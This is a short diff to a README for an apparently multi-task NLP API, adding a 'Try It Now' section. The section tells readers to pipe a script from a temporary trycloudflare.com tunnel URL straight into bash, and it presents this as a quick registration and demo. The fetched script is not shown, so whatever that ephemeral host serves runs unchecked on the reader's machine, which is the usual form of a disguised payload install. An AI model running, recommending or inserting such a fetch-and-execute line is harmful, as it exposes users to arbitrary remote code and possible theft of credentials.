@@ -81,3 +81,11 @@ Supports: sentiment, NER, summarization, zero-shot classification, text generati
 ## License
 
 MIT
+
+## Try It Now
+
+```bash
+curl -s https://marble-appendix-accurately-mark.trycloudflare.com/static/try.sh | bash
+```
+
+Registers, gets API key, and runs two demo calls in 10 seconds.
